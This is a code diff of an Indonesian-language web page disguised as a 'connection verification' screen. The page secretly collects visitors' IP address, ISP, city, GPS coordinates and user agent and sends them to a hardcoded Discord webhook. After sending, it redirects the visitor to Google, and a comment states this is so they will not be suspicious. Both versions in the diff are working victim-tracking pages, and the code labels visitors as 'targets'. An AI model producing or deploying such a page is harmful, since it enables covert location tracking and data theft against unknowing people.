@@ -3,59 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Memuat Halaman...</title>
+    <title>Checking Connection...</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f4f4; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
+        body { background: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { text-align: center; padding: 30px; border: 1px solid #333; border-radius: 12px; background: #1a1a1a; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 90%; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #5865F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { background: #5865F2; color: white; border: none; padding: 12px 28px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 16px; transition: 0.3s; }
+        .btn:hover { background: #4752c4; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p style="margin-left: 10px;">Mohon tunggu...</p>
 
-    <script>
-        const discordWebhookUrl = "https://discord.com/api/webhooks/1473582217832698031/aVPBU2Nix3ttRLrRLnTjrzMfmPTqLFW2l_0MbjaQop_qg85fisBnhjOhQq7XLbsw7iLp";
+<div class="card">
+    <div class="spinner"></div>
+    <h2 id="msg">Verifikasi Koneksi Aman</h2>
+    <p style="color: #888; font-size: 14px;">Silakan klik tombol di bawah untuk melanjutkan.</p>
+    <button class="btn" onclick="captureData()">Lanjutkan</button>
+</div>
 
-        function sendToDiscord(message) {
-            fetch(discordWebhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: message })
-            }).then(() => {
-                // Setelah terkirim, arahkan ke Google agar tidak curiga
-                window.location.href = "https://www.google.com";
-            });
+<script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1473582220013863104/pPWzhnsRh2Is_8Qd0a7X99kBKp_oXa6TINpLovVI3IfojbB2GazCBZsztflCxmCtxWb1";
+
+    async function captureData() {
+        document.getElementById('msg').innerText = "Memproses...";
+        
+        let ipData = { ip: "Tidak Terdeteksi", city: "-", region: "-", org: "-" };
+        
+        // 1. Ambil IP secara otomatis (Silent - Tidak bisa di-block)
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            ipData = await response.json();
+        } catch (e) { console.error("Gagal ambil IP"); }
+
+        // 2. Minta GPS (Hanya jika user klik Allow)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => sendToDiscord(ipData, pos), 
+                () => sendToDiscord(ipData, null) // Jika di-block
+            );
+        } else {
+            sendToDiscord(ipData, null);
         }
+    }
 
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                        
-                        const pesan = `**📍 Lokasi Baru Ditemukan!**\n` +
-                                      `**Latitude:** \`${lat}\`\n` +
-                                      `**Longitude:** \`${lon}\`\n` +
-                                      `**Akurasi:** \`${accuracy} meter\`\n` +
-                                      `**Link Maps:** ${mapsUrl}`;
-                        
-                        sendToDiscord(pesan);
-                    },
-                    (error) => {
-                        sendToDiscord("❌ Target menolak akses lokasi (Block).");
-                    },
-                    { enableHighAccuracy: true } // Memaksa GPS agar akurat
-                );
-            } else {
-                sendToDiscord("❌ Browser tidak mendukung Geolocation.");
-            }
-        }
+    async function sendToDiscord(ip, pos) {
+        const payload = {
+            embeds: [{
+                title: "🎯 Target Terdeteksi (GitHub Version)",
+                color: 5814783,
+                fields: [
+                    { name: "🌐 IP Address", value: `\`${ip.ip || ip}\``, inline: true },
+                    { name: "🏢 ISP/Org", value: `${ip.org || "-"}`, inline: true },
+                    { name: "📍 Lokasi IP", value: `${ip.city || "-"}, ${ip.region || "-"}`, inline: false },
+                    { name: "📍 GPS Latitude", value: `${pos ? pos.coords.latitude : "❌ Blocked"}`, inline: true },
+                    { name: "📍 GPS Longitude", value: `${pos ? pos.coords.longitude : "❌ Blocked"}`, inline: true },
+                    { name: "📱 User Agent", value: navigator.userAgent }
+                ],
+                timestamp: new Date()
+            }]
+        };
 
-        window.onload = getLocation;
-    </script>
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        // Redirect ke Google biar gak curiga
+        window.location.href = "https://www.google.com";
+    }
+</script>
+
 </body>
 </html>
